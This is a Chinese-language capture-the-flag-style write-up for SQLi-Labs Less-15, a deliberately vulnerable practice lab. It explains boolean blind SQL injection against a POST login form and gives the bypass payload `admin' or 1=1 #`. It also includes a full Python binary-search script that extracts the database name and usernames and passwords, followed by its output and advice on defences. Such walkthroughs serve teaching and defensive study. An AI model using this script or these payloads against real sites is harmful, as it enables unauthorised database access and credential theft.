## 一、题目信息
- 平台：SQLi-Labs
- 分类：Web - SQL Injection
- 难度：困难
- 通关标识：在无回显、无报错的 POST 登录框中，利用 Python 编写布尔盲注脚本，通过页面特征（图片差异）猜解出数据库名及账号密码。

## 二、大白话原理讲解
这一关的柜员（数据库）是个彻头彻尾的“哑巴”。
你输入正确的密码，页面变成 `SUCCESSFULLY LOGGED IN`；输入错误的密码，页面变成 `LOGIN ATTEMPT FAILED`。他不给你看数据，不给你报错，也不给你具体的提示。

更坑的是，如果你仔细观察返回的页面内容，你会发现成功和失败页面的文字长度居然一模一样！
但是，在源码深处，隐藏着真正的“暗号”：**如果登录成功，页面会加载一张 `flag.jpg` 的图片；如果失败，加载的是 `slap.jpg`。**

因此，我们的 Python 脚本不需要去找文字特征，只要去页面源码里找 `flag.jpg`，就能知道我们的条件到底猜没猜对。只要我们问出“数据库名的第一个字母是不是 s？”，页面加载了 `flag.jpg`，我们就知道猜对了。这就是**布尔盲注**。

## 三、解题步骤

**1. 抓包与人肉测试**
在登录框抓包，用户名输入 `admin'`，页面没有明显报错。
手工测试万能密码：
*   用户名：`admin' or 1=1 #`
*   密码：随意
页面成功显示 `SUCCESSFULLY LOGGED IN`。确认闭合符为单引号 `'`，注释符 `#` 有效。

**2. 编写 Python 布尔盲注脚本**
利用页面的图片加载特征（`flag.jpg`）作为布尔判断依据，使用二分法提升猜解效率。

```python
import requests

url = "http://127.0.0.1/sqli-labs-master/Less-15/"
success_mark = "flag.jpg"  # 核心：成功页面的特征图片

def is_true(cond):
    # 将条件拼接到 username 中
    data = {
        "uname": f"admin' AND ({cond}) #",
        "passwd": "123456",
        "submit": "Submit",
    }
    try:
        response = requests.post(url, data=data, timeout=5)
        return success_mark in response.text
    except:
        return False

def bisect(expr, low, high):
    """二分法猜解数值"""
    while low <= high:
        mid = (low + high) // 2
        if is_true(f"{expr}>{mid}"):
            low = mid + 1
        else:
            high = mid - 1
    return low

def extract(sql):
    """先猜长度，再逐字符猜 ASCII 码"""
    print(f"[*] 正在探测长度...")
    n = bisect(f"length(({sql}))", 0, 64)
    print(f"[+] 探测到长度为: {n}")
    
    result = ""
    for i in range(1, n + 1):
        ascii_code = bisect(f"ascii(substr(({sql}),{i},1))", 32, 126)
        result += chr(ascii_code)
        print(f"[+] 当前结果: {result}")
    return result

if __name__ == "__main__":
    # 查数据库名
    db_name = extract("select database()")
    print(f"\n[🎉] 数据库名为: {db_name}")
    
    # 查第一行账号密码
    print("\n[*] 开始爆破第一组账号密码...")
    user_data = extract("select concat(username,0x3a,password) from users limit 0,1")
    print(f"\n[🎉] 账号密码: {user_data}")
```

**3. 运行结果**
终端输出：
```text

[🎉] 数据库名为: security

[*] 开始爆破第一组账号密码...
[+] 当前结果: Dumb:Dumb
[🎉] 账号密码: Dumb:Dumb
```

## 四、知识点解析
1. **盲注的特征陷阱**：当页面文本长度固定时，不要死磕文本。去源码里找隐藏特征（如图片 src、特定标签、CSS 类名），往往能另辟蹊径。
2. **二分法查找**：猜解 ASCII 码时，二分法将次数从 100 多次缩减到 7 次左右，是盲注脚本的标配。
3. **分组提取**：在盲注中，`group_concat` 容易导致超长字符串，一般用 `limit` 配合 `concat` 一行一行提取，或者用 `substr` 分段截取。

## 五、总结与防御
**本题总结**：
Less-15 是经典的 POST 盲注关卡。它告诉我们，盲注不一定非要依靠文字回显。任何能引起页面差异的元素（图片、状态码、HTML 结构）都可以成为判断条件真假的“标尺”。

**安全防御建议**：
- **统一错误响应**：无论查询成功还是失败，返回给用户的页面内容、HTML 结构、图片加载都必须完全一致。
- **预编译语句（PDO/MySQLi）**：从根源上阻断 SQL 注入。
